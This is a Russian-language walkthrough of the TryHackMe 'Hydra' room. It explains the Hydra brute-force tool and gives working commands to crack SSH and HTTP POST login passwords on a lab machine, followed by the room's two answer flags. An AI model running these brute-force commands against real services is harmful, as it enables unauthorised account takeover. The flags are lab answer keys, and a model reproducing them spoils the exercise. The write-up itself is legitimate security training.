[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Hydra](https://tryhackme.com/r/room/hydra) 

Всего 2 задания:
## Задание 1
### Что такое Гидра ?
Hydra — это онлайн-программа для взлома паролей методом перебора, инструмент для быстрого «взлома» паролей входа в 
систему. 

Hydra может пройти по списку и «перебрать» некоторые службы аутентификации. Представьте себе попытку вручную угадать 
чей-то пароль на определенной службе (SSH, Web Application Form, FTP или SNMP) — мы можем использовать Hydra для 
прохождения по списку паролей и ускорить этот процесс для нас, определяя правильный пароль.  

Согласно официальному репозиторию , Hydra поддерживает, т. е. имеет возможность брутфорса следующих протоколов: 
«Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP -FORM-GET, HTTP -FORM-POST, HTTP - GET,
HTTP -HEAD, HTTP -POST, HTTP -PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP -Proxy,
ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere,
PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP , SMTP Enum, SNMP v1+v2+v3, 
SOCKS5, SSH (v1 и v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC и XMPP».

Более подробную информацию о параметрах каждого протокола в Hydra можно найти на странице инструментов Kali Hydra.

Это показывает важность использования надежного пароля; если ваш пароль распространенный, не содержит специальных 
символов и не превышает восьми символов, его будет легче угадать. Список из ста миллионов паролей содержит 
распространенные пароли, поэтому, когда готовое приложение использует простой пароль для входа, измените его со 
стандартного! Камеры видеонаблюдения и веб-фреймворки часто используют admin:passwordв качестве учетных данных для 
входа по умолчанию, что, очевидно, недостаточно надежно.

### Установка Гидры
Hydra уже установлена на AttackBox. Вы можете получить к ней доступ, нажав кнопку Start AttackBox .

Если вы предпочитаете использовать браузерную машину Kali, Hydra также предустановлена, как и во всех дистрибутивах 
Kali. Вы можете получить к ней доступ, выбрав Use Kali Linux и нажав кнопку Start Kali Linux.

Однако вы можете проверить его официальные репозитории, если вы предпочитаете использовать другой дистрибутив Linux. 
Например, вы можете установить Hydra на Ubuntu или Fedora, выполнив apt install hydraили dnf install hydra. Кроме 
того, вы можете загрузить его из официального репозитория THC- Hydra.

### Ответить на вопросы ниже
Прочитайте вышеизложенное и держите Гидру наготове.
```commandline
Ответ не нужен
```

## Задание 2
Разверните машину, подключенную к этой задаче, затем перейдите по адресу  http://MACHINE_IP  (загрузка этой машины 
может занять до 3 минут) 

### Команды Гидры
Параметры, которые мы передаем в Hydra, зависят от того, какую службу (протокол) мы атакуем. Например, если бы мы 
хотели провести брутфорс FTP с именем пользователя userи списком паролей passlist.txt, мы бы использовали следующую 
команду:  
```commandline
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

Для этой развернутой машины приведены команды для использования Hydra по SSH и веб-форме (метод POST).

SSH
```commandline
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
```
Вариант	Описание
- -l	указывает имя пользователя ( SSH ) для входа в систему
- -P	указывает список паролей
- -t	устанавливает количество создаваемых потоков


Например, `hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh` будет запущен со следующими аргументами:
- Hydra будет использовать root в качестве имени пользователя ssh
- Он попробует пароли в passwords.txt файле
- Будет четыре потока, работающих параллельно, как указано -t 4


Опубликовать веб-форму
Мы можем использовать Hydra для перебора веб-форм. Вы должны знать, какой тип запроса она делает; обычно 
используются методы GET или POST. Вы можете использовать вкладку «Сеть» вашего браузера (в инструментах разработчика)
, чтобы увидеть типы запросов или просмотреть исходный код.
```commandline
sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
```

Вариант	Описание
- -l	имя пользователя для входа в (веб-форму)
- -P	список паролей для использования
- http-post-form	тип формы — POST
- <path>	URL страницы входа, например,login.php
- <login_credentials>	имя пользователя и пароль, используемые для входа в систему, например, 
  username=^USER^&password=^PASS^
- <invalid_response>	часть ответа при неудачной попытке входа в систему
- -V	подробный вывод для каждой попытки
Ниже приведен более конкретный пример команды Hydra для взлома формы входа POST:

```commandline
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

- Страница входа — это только /, т.е. основной IP-адрес.
- Это username поле формы, в которое вводится имя пользователя.
- Указанные имена пользователей заменят^USER^
- Это password поле формы, куда вводится пароль.
- Предоставленные пароли будут заменены^PASS^
- Наконец, F=incorrect это строка, которая появляется в ответе сервера при неудачной попытке входа в систему.
- Теперь у вас должно быть достаточно информации, чтобы применить это на практике и взломать свои учетные данные на 
  развернутой машине!

### Ответить на вопросы ниже
```commandline
Зная имя учетной записи `molly` подставляем словарь для перебора паролей методом POST заполняя форму имя 
пользователя и пароль, а также указываем флаг, который показывает что попытка неудачна
hydra -l molly -P rockyou.txt 10.10.149.150 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or 
password is incorrect." -V
```
Используйте Hydra для подбора веб-пароля Молли. Что такое флаг 1?
```commandline
THM{2673a7dd116de68e85c48ec0b1f2612e}
```


Для взлома по ssh используем:
```commandline
hydra -l molly -P rockyou.txt 10.10.149.150 -t 4 ssh
```
Используйте Hydra для подбора пароля SSH Молли. Что такое флаг 2?
```commandline
THM{c8eeb0468febbadea859baeb33b2541b}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)